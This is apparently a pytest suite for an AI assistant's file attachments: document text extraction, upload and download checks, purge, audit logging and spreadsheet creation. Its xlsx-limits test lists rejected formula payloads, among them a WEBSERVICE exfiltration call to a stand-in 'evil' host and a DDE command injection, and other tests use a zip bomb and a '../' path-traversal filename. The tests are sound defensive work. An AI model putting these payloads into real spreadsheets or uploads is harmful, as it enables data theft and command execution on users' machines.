"""AI 첨부 읽기 (README 51) — 추출기, 업로드·내려받기, chat `attachments`, 7일 정리."""

import io
import zipfile
from datetime import UTC, datetime, timedelta

import openpyxl
import pytest
from fastapi import FastAPI
from httpx import AsyncClient
from sqlalchemy import func, select, update

from app import storage
from app.ai import extract
from app.ai.provider import ToolCall
from app.config import settings
from app.models import AiAttachment, AiSession, AuditEvent
from app.routers import ai

from .conftest import Users, csrf, login
from .test_ai import _chat, _knowledge, share_scope
from .test_ai_rules import Answering, SearchingProvider, _reset

W = "http://schemas.openxmlformats.org/wordprocessingml/2006/main"
HP = "http://www.hancom.co.kr/hwpml/2011/paragraph"


def docx_bytes(paragraphs: list[str], table: list[list[str]] | None = None) -> bytes:
    ps = "".join(f'<w:p><w:r><w:t xml:space="preserve">{p}</w:t></w:r></w:p>' for p in paragraphs)
    tbl = ""
    if table:
        rows = "".join(
            "<w:tr>"
            + "".join(f"<w:tc><w:p><w:r><w:t>{c}</w:t></w:r></w:p></w:tc>" for c in r)
            + "</w:tr>"
            for r in table
        )
        tbl = f"<w:tbl>{rows}</w:tbl>"
    xml = f'<?xml version="1.0"?><w:document xmlns:w="{W}"><w:body>{ps}{tbl}</w:body></w:document>'
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as z:
        z.writestr("word/document.xml", xml)
    return buf.getvalue()


def hwpx_bytes(paragraphs: list[str]) -> bytes:
    xml = (
        f'<?xml version="1.0"?><hs:sec xmlns:hs="x" xmlns:hp="{HP}">'
        + "".join(f"<hp:p><hp:run><hp:t>{p}</hp:t></hp:run></hp:p>" for p in paragraphs)
        + "</hs:sec>"
    )
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as z:
        z.writestr("Contents/section0.xml", xml)
    return buf.getvalue()


def xlsx_bytes() -> bytes:
    wb = openpyxl.Workbook()
    ws = wb.active
    ws.title = "매출"
    ws.append(["월", "매출"])
    ws.append(["1월", 120])
    ws.append([None, None])
    wb.create_sheet("메모").append(["비고"])
    buf = io.BytesIO()
    wb.save(buf)
    return buf.getvalue()


def pdf_bytes(text: str = "Hello PDF") -> bytes:
    """글자 하나 있는 최소 PDF(pypdf 가 추출한다)."""
    content = f"BT /F1 12 Tf 20 100 Td ({text}) Tj ET".encode()
    objs = [
        b"<< /Type /Catalog /Pages 2 0 R >>",
        b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>",
        b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 200 200] /Contents 4 0 R /Resources << /Font << /F1 5 0 R >> >> >>",
        b"<< /Length " + str(len(content)).encode() + b" >>\nstream\n" + content + b"\nendstream",
        b"<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>",
    ]
    out = io.BytesIO()
    out.write(b"%PDF-1.4\n")
    offsets = []
    for i, body in enumerate(objs, start=1):
        offsets.append(out.tell())
        out.write(f"{i} 0 obj\n".encode() + body + b"\nendobj\n")
    xref = out.tell()
    out.write(f"xref\n0 {len(objs) + 1}\n0000000000 65535 f \n".encode())
    for off in offsets:
        out.write(f"{off:010d} 00000 n \n".encode())
    out.write(
        f"trailer\n<< /Size {len(objs) + 1} /Root 1 0 R >>\nstartxref\n{xref}\n%%EOF\n".encode()
    )
    return out.getvalue()


def test_extract_each_format() -> None:
    assert extract.extract("a.txt", "안녕\r\n세상 ".encode()) == "안녕\n세상"
    assert extract.extract("a.txt", "한글".encode("cp949")) == "한글"  # UTF-8 아니면 CP949
    assert extract.extract("a.csv", b"a,b\n1,2\n") == "a | b\n1 | 2"
    assert (
        extract.extract("규정.docx", docx_bytes(["제1조", "본문"], [["월", "값"], ["1", "2"]]))
        == "제1조\n본문\n월 | 값\n1 | 2"
    )
    # 탭·줄바꿈 보존 — docx_bytes 는 문단 글자를 w:t 안에 그대로 넣으므로 run 요소를 직접 쓴다
    tab_xml = "<w:p><w:r><w:t>이름</w:t><w:tab/><w:t>값</w:t><w:br/><w:t>다음</w:t></w:r></w:p>"
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as z:
        z.writestr(
            "word/document.xml",
            f'<?xml version="1.0"?><w:document xmlns:w="{W}"><w:body>{tab_xml}</w:body></w:document>',
        )
    assert extract.extract("t.docx", buf.getvalue()) == "이름\t값\n다음"
    assert extract.extract("b.txt", b"a\n\n\n\nb") == "a\n\nb"  # 빈 줄 연속은 둘로
    assert extract.extract("a.hwpx", hwpx_bytes(["첫 문단", "둘째"])) == "첫 문단\n둘째"
    assert extract.extract("s.xlsx", xlsx_bytes()) == "## 매출\n월 | 매출\n1월 | 120\n## 메모\n비고"
    assert "Hello PDF" in extract.extract("a.pdf", pdf_bytes())
    for name, data in (
        ("a.hwp", b"HWP Document File"),
        ("a.png", b"\x89PNG"),
        ("a.docx", b"not a zip"),
        ("a", b"x"),
    ):
        with pytest.raises(extract.Unsupported):
            extract.extract(name, data)
    with pytest.raises(extract.Empty):
        extract.extract("a.txt", b"   \n ")
    with pytest.raises(extract.Empty):
        extract.extract("a.docx", docx_bytes([""]))
    assert len(extract.extract("big.txt", b"x" * (extract.MAX_CHARS + 10))) == extract.MAX_CHARS


async def _upload(
    client: AsyncClient, name: str, data: bytes, content_type: str = "application/octet-stream"
):
    return await client.post(
        "/api/ai/attachments", files={"file": (name, data, content_type)}, headers=csrf(client)
    )


@pytest.mark.usefixtures("minio_bucket")
async def test_upload_extracts_stores_and_chat_uses_it(
    app: FastAPI, client: AsyncClient, users: Users, app_db, monkeypatch
) -> None:
    class Two(Answering):
        answer = "1월 매출은 120[[1]], 규정은 제1조[[2]]"

    _reset(app, Two)
    share_scope(monkeypatch, app_db)
    await _knowledge(app_db, users)
    ai._ai_calls.clear()
    await login(client, "sujin@zenith.co.kr")
    xlsx = xlsx_bytes()
    r = await _upload(
        client,
        "매출.xlsx",
        xlsx,
        "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet; charset=x",
    )
    assert r.status_code == 201, r.text
    a = r.json()
    assert a["name"] == "매출.xlsx" and a["chars"] == len(
        "## 매출\n월 | 매출\n1월 | 120\n## 메모\n비고"
    )
    assert a["content_type"] == "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet"
    r = await _upload(client, "../규정.docx", docx_bytes(["제1조 목적"]))
    assert (
        r.status_code == 201 and r.json()["name"] == "_규정.docx"
    )  # 경로 조각은 safe_name 이 _ 로
    b = r.json()
    ev = await _chat(client, "매출이랑 규정?", attachments=[a["id"], b["id"]])
    system = SearchingProvider.systems[0]
    block = system[-1]["text"]
    assert block.startswith(ai.ATTACH_PROMPT) and "<첨부>" in block
    assert "[1] 《매출.xlsx》 ## 매출" in block and "[2] 《_규정.docx》 제1조 목적" in block
    assert "cache_control" not in system[-1]  # 질문마다 다르다 — 캐시 지점 없음
    citations = next(d for e, d in ev if e == "citations")
    assert [(c["n"], c["type"], c["title"], c["path"]) for c in citations] == [
        (1, "file", "매출.xlsx", "첨부"),
        (2, "file", "_규정.docx", "첨부"),
    ]
    assert citations[0]["to"] == f"/api/ai/attachments/{a['id']}" and citations[0]["doc_id"] is None
    # 원본 내려받기 — 올린 사람만, no-store
    r = await client.get(f"/api/ai/attachments/{a['id']}")
    assert r.status_code == 200 and r.content == xlsx  # 같은 바이트(앞 서명 확인)
    assert (
        r.headers["cache-control"] == "no-store"
        and r.headers["content-security-policy"] == "default-src 'none'; sandbox"
    )
    assert r.headers["content-type"] == "application/octet-stream"  # 클라이언트 종류를 믿지 않는다
    assert "filename*=UTF-8''%EB%A7%A4%EC%B6%9C.xlsx" in r.headers["content-disposition"]
    await login(client, "jaeho@zenith.co.kr")
    assert (await client.get(f"/api/ai/attachments/{a['id']}")).status_code == 404  # 남의 것
    r = await client.post(
        "/api/ai/chat", json={"message": "?", "attachments": [a["id"]]}, headers=csrf(client)
    )
    assert r.status_code == 422 and r.json()["detail"] == "없는 첨부입니다."
    ai._ai_calls.clear()


@pytest.mark.usefixtures("minio_bucket")
async def test_upload_rejections(app: FastAPI, client: AsyncClient, users: Users, app_db) -> None:
    ai._ai_calls.clear()
    await login(client, "sujin@zenith.co.kr")
    for name, data, detail in (
        ("a.hwp", b"HWP Document", "지원하지 않는 파일 형식입니다(txt·md·csv·docx·xlsx·pdf·hwpx)."),
        ("a.txt", b"   ", "읽을 글자가 없는 파일입니다."),
        ("a.txt", b"", "빈 파일입니다."),
    ):
        r = await _upload(client, name, data)
        assert r.status_code == 422 and r.json()["detail"] == detail, (name, r.text)
    r = await _upload(client, "big.txt", b"x" * (ai.ATTACH_MAX_BYTES + 1))
    assert r.status_code == 422 and r.json()["detail"] == "10MB 이하 파일만 올릴 수 있습니다."
    assert await app_db.scalar(select(func.count(AiAttachment.id))) == 0
    ai._ai_calls.clear()


@pytest.mark.usefixtures("minio_bucket")
async def test_attachment_limits_budget_and_purge(
    app: FastAPI, client: AsyncClient, users: Users, app_db, monkeypatch
) -> None:
    _reset(app, Answering)
    share_scope(monkeypatch, app_db)
    await _knowledge(app_db, users)
    ai._ai_calls.clear()
    await login(client, "sujin@zenith.co.kr")
    ids = [
        (await _upload(client, f"{i}.txt", f"파일 {i} ".encode() * 20)).json()["id"]
        for i in range(ai.MAX_ATTACHMENTS + 1)
    ]
    r = await client.post(
        "/api/ai/chat", json={"message": "?", "attachments": ids}, headers=csrf(client)
    )
    assert r.status_code == 422 and r.json()["detail"] == "첨부는 3개까지입니다."
    assert await app_db.scalar(select(func.count(AiSession.id))) == 0
    monkeypatch.setattr(settings, "ai_doc_max_chars", 100)
    SearchingProvider.systems = []
    await _chat(client, "?", attachments=ids[:3])
    block = SearchingProvider.systems[0][-1]["text"]
    assert (
        "(본문이 길어 앞" in block
        and "(본문 한도를 다 써서 넣지 못했다: 《2.txt》)" in block
        and "[3]" not in block
    )
    # 7일 지난 것만 지운다 — 원본도
    await app_db.execute(
        update(AiAttachment)
        .where(AiAttachment.id == ids[0])
        .values(created_at=datetime.now(UTC) - timedelta(days=8))
    )
    await app_db.commit()
    assert await ai.purge_attachments(app_db) == 1
    assert await app_db.scalar(select(func.count(AiAttachment.id))) == len(ids) - 1
    assert await storage.get(f"ai/{users.member.id}/{ids[0]}/0.txt") is None
    assert await storage.get(f"ai/{users.member.id}/{ids[1]}/1.txt") is not None
    ai._ai_calls.clear()


def test_extract_review_cases() -> None:
    """리뷰에서 재현된 경계: 깨진 XML·hwpx tab/표 중복·docx 콘텐츠 컨트롤·zip 총량·암호 PDF."""
    # 깨진 docx(XML 오류)·CSV 거대 필드 → Unsupported(500 아님)
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as z:
        z.writestr("word/document.xml", "<w:document><w:body><w:p>")
    with pytest.raises(extract.Unsupported):
        extract.extract("broken.docx", buf.getvalue())
    with pytest.raises(extract.Unsupported):
        extract.extract("a.csv", ('"' + "x" * 200_000).encode())
    # hwpx: tab·lineBreak 뒤 글자(tail) 보존, 표 셀 문단은 한 번만
    xml = (
        f'<?xml version="1.0"?><hs:sec xmlns:hs="x" xmlns:hp="{HP}">'
        "<hp:p><hp:run><hp:t>앞<hp:tab/>뒤<hp:lineBreak/>다음</hp:t></hp:run></hp:p>"
        "<hp:p><hp:run><hp:tbl><hp:tr><hp:tc><hp:subList><hp:p><hp:run><hp:t>셀A</hp:t></hp:run></hp:p></hp:subList></hp:tc>"
        "<hp:tc><hp:subList><hp:p><hp:run><hp:t>셀B</hp:t></hp:run></hp:p></hp:subList></hp:tc></hp:tr></hp:tbl></hp:run></hp:p>"
        "</hs:sec>"
    )
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as z:
        z.writestr("Contents/section0.xml", xml)
    assert extract.extract("t.hwpx", buf.getvalue()) == "앞\t뒤\n다음\n셀A\n셀B"
    # docx: w:sdt 안 문단
    xml = (
        f'<?xml version="1.0"?><w:document xmlns:w="{W}"><w:body>'
        "<w:sdt><w:sdtContent><w:p><w:r><w:t>표지제목</w:t></w:r></w:p></w:sdtContent></w:sdt>"
        "<w:p><w:r><w:t>본문</w:t></w:r></w:p></w:body></w:document>"
    )
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as z:
        z.writestr("word/document.xml", xml)
    assert extract.extract("s.docx", buf.getvalue()) == "표지제목\n본문"
    # zip 총량 상한 — 선언 크기 기준
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", compression=zipfile.ZIP_DEFLATED) as z:
        for i in range(4):
            z.writestr(f"word/pad{i}.xml", b"0" * (extract.MAX_ZIP_TOTAL // 3))
        z.writestr("word/document.xml", docx_bytes(["x"]).decode("latin1")[:0] or "<w:document/>")
    with pytest.raises(extract.Unsupported):
        extract.extract("bomb.docx", buf.getvalue())
    # 암호 PDF → Unsupported
    import pypdf

    w = pypdf.PdfWriter()
    w.add_blank_page(100, 100)
    w.encrypt("pw")
    out = io.BytesIO()
    w.write(out)
    with pytest.raises(extract.Unsupported):
        extract.extract("enc.pdf", out.getvalue())


@pytest.mark.usefixtures("minio_bucket")
async def test_purge_deletes_rows_even_if_minio_fails(
    app: FastAPI, client: AsyncClient, users: Users, app_db, monkeypatch
) -> None:
    ai._ai_calls.clear()
    await login(client, "sujin@zenith.co.kr")
    for i in range(2):
        assert (await _upload(client, f"p{i}.txt", b"old text")).status_code == 201
    await app_db.execute(
        update(AiAttachment).values(created_at=datetime.now(UTC) - timedelta(days=8))
    )
    await app_db.commit()
    calls: list[str] = []

    async def flaky(prefix: str) -> None:
        calls.append(prefix)
        if len(calls) == 1:
            raise RuntimeError("minio down")

    monkeypatch.setattr(storage, "remove_prefix", flaky)
    assert await ai.purge_attachments(app_db) == 2
    assert await app_db.scalar(select(func.count(AiAttachment.id))) == 0  # 평문 행은 전부 지워졌다
    assert len(calls) == 2  # 첫 실패 뒤에도 둘째를 시도했다
    ai._ai_calls.clear()


@pytest.mark.usefixtures("minio_bucket")
async def test_upload_quota_nul_and_audit(
    app: FastAPI, client: AsyncClient, users: Users, app_db, monkeypatch
) -> None:
    from app.models import AuditEvent

    ai._upload_calls.clear()
    await login(client, "sujin@zenith.co.kr")
    r = await _upload(client, "nul.txt", b"ab\x00cd")  # NUL 은 지워져 저장된다(Postgres text)
    assert r.status_code == 201 and r.json()["chars"] == 4
    ev = await app_db.scalar(select(AuditEvent).where(AuditEvent.kind == "ai.attachment"))
    assert (
        ev is not None
        and ev.actor_id == users.member.id
        and set(ev.detail) == {"size", "sha", "ext"}
    )
    assert ev.detail["ext"] == "txt" and "nul" not in str(ev.detail)  # 파일명은 남기지 않는다
    monkeypatch.setattr(ai, "ATTACH_QUOTA_BYTES", 10)
    r = await _upload(client, "more.txt", b"0123456789")
    assert r.status_code == 422 and r.json()["detail"].startswith("첨부 보관 한도를 넘었습니다")
    assert await app_db.scalar(select(func.count(AiAttachment.id))) == 1
    ai._upload_calls.clear()


@pytest.mark.usefixtures("minio_bucket")
async def test_chat_creates_spreadsheet_as_attachment(
    app: FastAPI, client: AsyncClient, users: Users, app_db, monkeypatch
) -> None:
    """README 55: 모델이 create_spreadsheet 를 부르면 xlsx 첨부가 생기고 파일 카드 번호로 각주가 달린다. 틀린 표는
    is_error, 한 답변에 하나, 팩트체커에는 도구가 없다."""

    class Maker(SearchingProvider):
        async def stream(self, *, system, messages, max_tokens=None, tools=None, tool_choice=None):
            SearchingProvider.turns.append(messages)
            SearchingProvider.tools_seen.append(tools)
            last = messages[-1]["content"]
            if not (isinstance(last, list) and last and last[0].get("type") == "tool_result"):
                yield self.calls(
                    ToolCall(
                        id="bad", name="create_spreadsheet", input={"name": "x", "sheets": []}
                    ),
                    ToolCall(
                        id="ok",
                        name="create_spreadsheet",
                        input={
                            "name": "월별 이익/정리 "
                            + "가" * 70
                            + ".XLSX",  # 긴 한글 이름 — 확장자가 잘리지 않는다
                            "sheets": [
                                {
                                    "title": "이익",
                                    "rows": [
                                        ["월", "매출", "비용", "이익"],
                                        ["1월", 120, 80, "=B2-C2"],
                                    ],
                                }
                            ],
                        },
                    ),
                    ToolCall(
                        id="again",
                        name="create_spreadsheet",
                        input={"name": "y", "sheets": [{"rows": [[1]]}]},
                    ),
                )
                return
            # 도구 결과가 준 링크를 답에 그대로(팩트체커 호출에선 도구가 없어 오류 문구만 온다 — 링크 없음)
            _, _, link = last[1]["content"].partition("넣습니다: ")
            yield f"만들었습니다. {link}"

    _reset(app, Maker)
    share_scope(monkeypatch, app_db)
    SearchingProvider.turns, SearchingProvider.tools_seen = [], []
    ai._ai_calls.clear()
    await login(client, "sujin@zenith.co.kr")
    ev = await _chat(client, "월별 이익을 엑셀로 만들어 줘")
    assert [t["name"] for t in SearchingProvider.tools_seen[0]] == [
        "search_knowledge",
        "read_document",
        "create_spreadsheet",
    ]
    assert ("status", {"text": "파일을 만드는 중"}) in ev
    results = {r["tool_use_id"]: r for r in SearchingProvider.turns[-1][-1]["content"]}
    assert (
        results["bad"]["is_error"] is True and "표 모양이 틀렸습니다" in results["bad"]["content"]
    )
    assert "is_error" not in results["ok"] and results["ok"]["content"].startswith(
        "《월별 이익_정리 가가"
    )
    assert results["again"]["is_error"] is True and "하나만" in results["again"]["content"]
    citations = next(d for e, d in ev if e == "citations")
    assert citations == []  # 근거 카드가 아니라 답 본문의 링크
    att = await app_db.scalar(select(AiAttachment).where(AiAttachment.user_id == users.member.id))
    assert att is not None
    answer = "".join(d["text"] for e, d in ev if e == "token")
    assert f"](/api/ai/attachments/{att.id})" in answer and "[📎 월별 이익_정리 가가" in answer
    assert att.name.endswith(".xlsx") and len(att.name.encode()) <= 155
    assert att.name.startswith("월별 이익_정리 가가") and att.content_type == ai.XLSX_TYPE
    # 다음 질문에서 첨부로 읽힌다 — 수식 셀은 엑셀이 계산한 적이 없어 평문에선 빈칸(openpyxl 은 캐시 값을 안 만든다)
    assert "## 이익" in att.text and "1월 | 120 | 80 |" in att.text
    # 내려받기 — 올린 사람만, 진짜 xlsx(수식·머리글 굵게)
    r = await client.get(f"/api/ai/attachments/{att.id}")
    # 내려받기는 늘 octet-stream(README 51) — 이름은 Content-Disposition 으로
    assert r.status_code == 200 and "xlsx" in r.headers["content-disposition"]
    wb = openpyxl.load_workbook(io.BytesIO(r.content))
    ws = wb["이익"]
    assert ws["D2"].value == "=B2-C2" and ws["A1"].font.bold and ws["B2"].value == 120
    ev2 = await app_db.scalar(select(AuditEvent).where(AuditEvent.kind == "ai.file_create"))
    assert ev2 is not None and ev2.actor_id == users.member.id and ev2.target_id == att.id
    assert ev2.detail["ext"] == "xlsx" and len(ev2.detail["sha"]) == 16
    # 팩트체커에는 파일 만들기 도구가 없다
    SearchingProvider.tools_seen = []
    await client.post("/api/ai/check", json={"text": "연차는 15일"}, headers=csrf(client))
    assert "create_spreadsheet" not in [t["name"] for t in SearchingProvider.tools_seen[0]]


def test_build_xlsx_limits() -> None:
    from app.ai.make import MAX_CELLS, MAX_COLS, MAX_ROWS, MAX_SHEETS, BadSpec, build_xlsx

    for bad in (
        None,
        [],
        [{"rows": "x"}],
        [{"rows": [[1] * (MAX_COLS + 1)]}],
        [{"rows": [[1]] * (MAX_ROWS + 1)}],
        [{"rows": [[1] * MAX_COLS] * (MAX_CELLS // MAX_COLS + 1)}],
        [{"rows": [[1]]}] * (MAX_SHEETS + 1),
        [{"rows": [[{"a": 1}]]}],
        [{"rows": [["x" * 1001]]}],
        [{"rows": [[float("inf")]]}],
        [{"rows": [[]]}],  # 빈 표
        [{"title": "A", "rows": [[1]]}, {"title": "a", "rows": [[1]]}],
        # 수식 — 문자열·외부 참조·허용 밖 함수(보안 리뷰: 셀 값 반출·DDE)
        [{"rows": [['=WEBSERVICE("https://evil/?"&B2)']]}],
        [{"rows": [['=HYPERLINK("https://evil","x")']]}],
        [{"rows": [["=cmd|' /C calc'!A0"]]}],
        [{"rows": [["=[book.xlsx]Sheet1!A1"]]}],
        [{"rows": [["=INDIRECT(A1)"]]}],
    ):
        with pytest.raises(BadSpec):
            build_xlsx(bad)
    data = build_xlsx(
        [
            {
                "title": "'매출[1]/2'",
                "rows": [["a", None, True, 1.5], ["b\x00c\ud800", "=SUM(A1:A2)+ROUND(B2,1)"]],
            },
            {"title": "History", "rows": [[1]]},
        ]
    )
    wb = openpyxl.load_workbook(io.BytesIO(data))
    assert wb.sheetnames == ["매출_1__2", "History_"]
    ws = wb["매출_1__2"]
    assert (
        ws["A2"].value == "bc"
        and ws["B2"].value == "=SUM(A1:A2)+ROUND(B2,1)"
        and ws["A1"].font.bold
    )
